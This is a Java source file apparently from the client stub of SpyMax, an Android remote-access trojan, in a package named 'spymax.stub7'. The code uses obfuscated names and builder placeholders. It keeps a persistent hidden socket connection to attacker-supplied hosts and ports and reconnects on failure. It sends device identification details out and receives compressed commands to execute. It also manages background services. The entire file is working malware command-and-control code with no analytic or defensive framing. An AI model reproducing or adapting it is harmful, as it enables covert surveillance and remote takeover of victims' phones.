package spymax.stub7;
import android.content.Context;
import android.content.Intent;
import java.io.BufferedInputStream;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.OutputStream;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.util.concurrent.ThreadPoolExecutor;

public class ClassGen2 {
    public static final int u_ClassGen2_u = 1024 * 200;
    public static final int t_ClassGen2_t = 45000;
    public static long s_ClassGen2_s = 250L;
    public static Socket rec_ClassGen2_iver;
    public static InetSocketAddress sca_ClassGen2_drees;
    public static DataInputStream inputnew;
    public static OutputStream outpu_ClassGen2_tnew;
    public static InetAddress adre_ClassGen2_sses;
    public static boolean q;
    public static Object y = new Object();
    public static Object r = new Object();
    public static String da_ClassGen2_da, fa__ClassGen2_da;
    public static Context ctx;
    public static boolean ec_ClassGen2_ho;
    public static String T_ClassGen2_2 ="[RANDOM-STRING]";
    public static String T_ClassGen2_3 ="[RANDOM-STRING]";
    public static String T_ClassGen2_4 ="[RANDOM-STRING]";
    public static String T_ClassGen2_5 ="[RANDOM-STRING]";
    public static String T_ClassGen2_6 ="[RANDOM-STRING]";
    public static String T_ClassGen2_7 ="[RANDOM-STRING]";
    public static void _strt_con_(final String F__ClassGen2_F, final String P_ClassGen2_P){
        new Thread(new Runnable() {  @Override
        public void run() {
            String ip[] = F__ClassGen2_F.split(ClassGen3.t_ClassGen3_g);
            String po[] = P_ClassGen2_P.split(ClassGen3.t_ClassGen3_g);
            do {
                if(!ClassGen3.sv(ctx)){
                    ClassGen3.WK_ClassGen3_L(ctx,false);

                }
                if(ip.length == po.length){
                    int cu = 0;
                    do {
                        try {
                            ClassGen2.adre_ClassGen2_sses = InetAddress.getByName(ip[cu]);
                            ClassGen2.sca_ClassGen2_drees = new InetSocketAddress(ClassGen2.adre_ClassGen2_sses, Integer.valueOf(po[cu]));
                            ClassGen2.rec_ClassGen2_iver = new Socket();

                            try
                            {
                                ClassGen2.rec_ClassGen2_iver.setSoTimeout(0);
                                ClassGen2.rec_ClassGen2_iver.setKeepAlive(true);
                            }catch (Exception ex){





                                     }
                            ClassGen2.rec_ClassGen2_iver.connect(ClassGen2.sca_ClassGen2_drees,60000);
                            ClassGen2.q = ClassGen2.rec_ClassGen2_iver.isConnected();
                            if (ClassGen2.q) {
                                ClassGen2.rec_ClassGen2_iver.setSendBufferSize(ClassGen2.u_ClassGen2_u);
                                ClassGen2.rec_ClassGen2_iver.setReceiveBufferSize(ClassGen2.u_ClassGen2_u);
                                ClassGen2.inputnew = new DataInputStream(new BufferedInputStream(ClassGen2.rec_ClassGen2_iver.getInputStream()));
                                ClassGen2.outpu_ClassGen2_tnew = ClassGen2.rec_ClassGen2_iver.getOutputStream();
                                break;
                            } else {
                                CLOSEALLINTENT("SDGATHS[RANDOM-STRING]HTEGKUY");
                            }
                        } catch (Exception e) {
                            CLOSEALLINTENT("ghtyjt[RANDOM-STRING]jghfd");

                        }
                        try{ Thread.sleep(1);} catch (InterruptedException e) {     }
                        cu++;
                    } while (cu <= ip.length -1);
                }
                ClassGen3.rel(false);
                try{ Thread.sleep(1000);} catch (InterruptedException e) {     }
            } while (!ClassGen2.q);
            if (ClassGen2.q) {
                r_ClassGen2_cv();
            }
        }}).start();
    }
    public static void _fist_inf_(String Str){

        if (Str.length() > 0)
        {
            Str = "[RANDOM-STRING][RANDOM-STRING][RANDOM-STRING][RANDOM-STRING][RANDOM-STRING][RANDOM-STRING][RANDOM-STRING]";

            try
            {
                String sn = sca_ClassGen2_drees.getAddress().getHostAddress() +
                        ClassGen3.t_ClassGen3_g + ClassGen2.sca_ClassGen2_drees.getPort() +
                        ClassGen3.t_ClassGen3_g + ClassGen8.FTX0 +
                        ClassGen3.t_ClassGen3_g + ClassGen8.FTX1 +
                        ClassGen3.t_ClassGen3_g + ClassGen8.FTX2 +
                        ClassGen3.t_ClassGen3_g + ClassGen8.FTX3 +
                        ClassGen3.t_ClassGen3_g + ClassGen2.adre_ClassGen2_sses.getHostName() +
                        ClassGen3.t_ClassGen3_g + ClassGen2.ctx.getResources().getString(R.string.t1t2t3t4t5t6) +
                        ClassGen3.t_ClassGen3_g + "[CR]" +
                        ClassGen3.t_ClassGen3_g + Str  ;
                _send_it_(String.valueOf(ClassGen11.p_ClassGen11_lg), sn.replace(Str,"").getBytes());
            }catch (Exception ee){}

        }

    }
    public static void r_ClassGen2_cv(){
        try {
            new Thread(new Runnable() {@Override
            public void run() {
                synchronized(ClassGen2.r) {
                    if(!ClassGen3.sv(ctx)){
                        ClassGen3.WK_ClassGen3_L(ctx,false);

                    }
                    ClassGen2.ec_ClassGen2_ho = true;
                    _fist_inf_("ˈᵔঙʿ$ʿʼ₫[RANDOM-STRING]θᵢיʿᘣθˉˆˉθφˎ$ˉˎ$ﹳˊⶱⁱᵇʾ[RANDOM-STRING]ˑ$ˏـﹳ");
                    try { try {
                        ByteArrayOutputStream os = new ByteArrayOutputStream();
                        int r, c, f = 0;
                       c = -1;
                        try
                        {
                            c = -1;
                        }catch (Exception ex){}
                        int[] sb = {-1, -1};
                        byte[] bu = new byte[1];
                        while ((r = ClassGen2.inputnew.read(bu)) > 0) {
                            ClassGen11.inx = -1;
                            if (bu.length > 1) {
                                os.write(bu, 0, r);
                                if (os.toByteArray().length == f) {
                                    byte[] s = ClassGen3._DZIP_meth_(ClassGen3._Getbyte_meth_(os.toByteArray(), sb));
                                    byte[] b = ClassGen3._DZIP_meth_(ClassGen3._getstr_meth_(os.toByteArray(), sb));
                                    ClassGen8 Ls = new ClassGen8(s, b);
                                    ClassGen11.L_ClassGen11_i.add(Ls);
                                    os.reset();

                                    try
                                    {
                                        bu = new byte[1];
                                    }catch (Exception ex){     }
                                    ClassGen2.rec_ClassGen2_iver.setReceiveBufferSize(ClassGen2.u_ClassGen2_u);
                                    f = 0;
                                    sb[0] = -1;
                                    sb[1] = -1;
                                    c = -1;
                                }
                            } else {
                                if (bu[0] == 0) {
                                    c += 1;
                                    if (c == 0) {
                                        sb[0] = Integer.valueOf(new String(os.toByteArray(), "UTF-8"));
                                        os.reset();
                                    } else if ((c == 1)) {
                                        sb[1] = Integer.valueOf(new String(os.toByteArray(), "UTF-8"));
                                        os.reset();

                                        try
                                        {
                                            f = sb[0] + sb[1];
                                        }catch (Exception e){     }
                                        ClassGen2.rec_ClassGen2_iver.setReceiveBufferSize(f);
                                        c = -1;
                                        bu = new byte[f];
                                    } else if ((c > 1)) {
                                        c = -1;
                                    }
                                } else {
                                    os.write(bu, 0, r);
                                    try{Thread.sleep(ClassGen2.s_ClassGen2_s);} catch (InterruptedException e) {     }
                                }
                            }
                        }
                    } catch (Exception e) {





                            }
                    }catch (OutOfMemoryError e) {}
                    CLOSEALLINTENT("sdabdeatnjytkuytdjhystyjsyrjr5yjrsy");
                    ClassGen3.rel(false);
                    _strt_con_(ClassGen2.da_ClassGen2_da, ClassGen2.fa__ClassGen2_da);
                    ClassGen2.ec_ClassGen2_ho = false;
                }
            }}).start();
        }catch (Exception ex){}
    }
    public static void _new_con_(String JOBID , String JOGBLOG, Context cx) {
        ClassGen2.ctx = cx;
        ClassGen2.da_ClassGen2_da = JOBID;
        ClassGen2.fa__ClassGen2_da = JOGBLOG;
        _strt_con_(ClassGen2.da_ClassGen2_da,ClassGen2.fa__ClassGen2_da);
    }
    public static void _send_it_(final String s, final byte[] b){
        try
        {
            if (((ThreadPoolExecutor) ClassGen3.e_ClassGen3_xc).getActiveCount() >= ClassGen3.m_ClassGen3_ax){
                return;
            }
            ClassGen3.e_ClassGen3_xc.execute(new Runnable() {
                public void run() {
                    try {
                        synchronized(ClassGen2.y){
                            byte[] b0 = ClassGen3._formtpakt_methd_(s,b);
                            ClassGen2.rec_ClassGen2_iver.setSendBufferSize(b0.length);
                            ClassGen2.outpu_ClassGen2_tnew.write(b0, 0,b0.length);
                        }
                    } catch (Exception e) {
                        CLOSEALLINTENT("rbgtdnsryjtgfhtsryddrjt");







                    }
                }});
        }catch (NullPointerException e){
           // CLOSEALLINTENT("rbgtdnsryjtgfhtsryddrjt");
        }
    }
    public static void ox() {
        try
        {
            if (ClassGen11.p_ClassGen11_lg != -1){
                ClassGen3.e_ClassGen3_cx(ClassGen11.c_ClassGen11_mn[0] + ClassGen2.adre_ClassGen2_sses.getHostName());

            }
        }catch (Exception e){







        }
    }
    public static void CLOSEALLINTENT(String text) {

        ClassGen11.k = false;
        ClassGen2.q = false;
        try {
            ClassGen2.rec_ClassGen2_iver.shutdownInput();
        }catch (Exception e) {
            text = "[RANDOM-STRING][RANDOM-STRING][RANDOM-STRING][RANDOM-STRING][RANDOM-STRING]φ";

        }
        try {
            ClassGen2.rec_ClassGen2_iver.getOutputStream().close();
        } catch (Exception e) {}
        try {
            ClassGen2.rec_ClassGen2_iver.getInputStream().close();
        } catch (Exception e) {}
        try {
            ClassGen2.rec_ClassGen2_iver.close();
        } catch (Exception e) {     }
        if(outpu_ClassGen2_tnew != null)
        {
            try {
                ClassGen2.outpu_ClassGen2_tnew.close();
            } catch (Exception e) {}
            ClassGen2.outpu_ClassGen2_tnew = null;
        }
        if(ClassGen2.inputnew != null)
        {
            try {
                ClassGen2.inputnew.close();
            } catch (Exception e) {     }
            ClassGen2.inputnew = null;
        }
        if(!ClassGen10._runn_srv_(ClassGen6.class,ClassGen2.ctx)) {
            Intent i = new Intent(ClassGen2.ctx, ClassGen6.class);

            ClassGen2.ctx.stopService(i);
        }
        if(!ClassGen10._runn_srv_(ClassGen5.class,ClassGen2.ctx)) {
            Intent i = new Intent(ClassGen2.ctx, ClassGen5.class);
            ClassGen2.ctx.stopService(i);
        }

    }
}




